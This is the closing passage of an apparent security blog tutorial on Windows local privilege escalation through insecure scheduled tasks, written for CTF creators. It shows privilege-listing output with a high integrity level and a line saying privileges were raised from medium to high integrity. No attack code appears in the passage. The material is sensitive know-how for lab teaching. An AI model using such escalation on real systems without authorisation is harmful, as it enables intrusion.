+</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\N</span>TLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group 
+</span></span><span class="line"><span class="cl">Mandatory Label<span class="se">\H</span>igh Mandatory Level                          Label            S-1-16-12288                                                    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PRIVILEGES INFORMATION
+</span></span><span class="line"><span class="cl">----------------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Privilege Name                            Description                                                        <span class="nv">State</span>
+</span></span><span class="line"><span class="cl"><span class="o">=========================================</span> <span class="o">==================================================================</span> <span class="o">========</span>
+</span></span><span class="line"><span class="cl">SeIncreaseQuotaPrivilege                  Adjust memory quotas <span class="k">for</span> a process                                 Disabled
+</span></span><span class="line"><span class="cl">SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
+</span></span><span class="line"><span class="cl">SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
+</span></span><span class="line"><span class="cl">SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
+</span></span><span class="line"><span class="cl">SeSystemProfilePrivilege                  Profile system performance                                         Disabled
+</span></span><span class="line"><span class="cl">SeSystemtimePrivilege                     Change the system <span class="nb">time</span>                                             Disabled
+</span></span><span class="line"><span class="cl">SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
+</span></span><span class="line"><span class="cl">SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
+</span></span><span class="line"><span class="cl">SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
+</span></span><span class="line"><span class="cl">SeBackupPrivilege                         Back up files and directories                                      Disabled
+</span></span><span class="line"><span class="cl">SeRestorePrivilege                        Restore files and directories                                      Disabled
+</span></span><span class="line"><span class="cl">SeShutdownPrivilege                       Shut down the system                                               Disabled
+</span></span><span class="line"><span class="cl">SeDebugPrivilege                          Debug programs                                                     Enabled
+</span></span><span class="line"><span class="cl">SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
+</span></span><span class="line"><span class="cl">SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+</span></span><span class="line"><span class="cl">SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
+</span></span><span class="line"><span class="cl">SeUndockPrivilege                         Remove computer from docking station                               Disabled
+</span></span><span class="line"><span class="cl">SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
+</span></span><span class="line"><span class="cl">SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+</span></span><span class="line"><span class="cl">SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+</span></span><span class="line"><span class="cl">SeIncreaseWorkingSetPrivilege             Increase a process working <span class="nb">set</span>                                     Disabled
+</span></span><span class="line"><span class="cl">SeTimeZonePrivilege                       Change the <span class="nb">time</span> zone                                               Disabled
+</span></span><span class="line"><span class="cl">SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
+</span></span><span class="line"><span class="cl">SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token <span class="k">for</span> another user in the same session Disabled
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ERROR: Unable to get user claims information.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>As we can see we have elevated our privileges <strong>medium integrity level</strong> to <strong>high integrity level</strong>.</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2022-03-20</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/scheduled-tasks/">Scheduled Tasks</a>,&nbsp;<a href="/tags/insecure-scheduled-tasks/">Insecure Scheduled Tasks</a>,&nbsp;<a href="/tags/local-privilege-escalation/">Local Privilege Escalation</a>,&nbsp;<a href="/tags/windows/">Windows</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/linux-privesc-cron-jobs/" class="prev" rel="prev" title="Linux Privilege Escalation - Cron Jobs for CTF Creators"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Linux Privilege Escalation - Cron Jobs for CTF Creators</a>
+            <a href="/windows-privesc-registry/" class="next" rel="next" title="Windows Local Privilege Escalation - Registry Hives for CTF Creators">Windows Local Privilege Escalation - Registry Hives for CTF Creators<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.138.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2021 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":-1},"comment":{},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
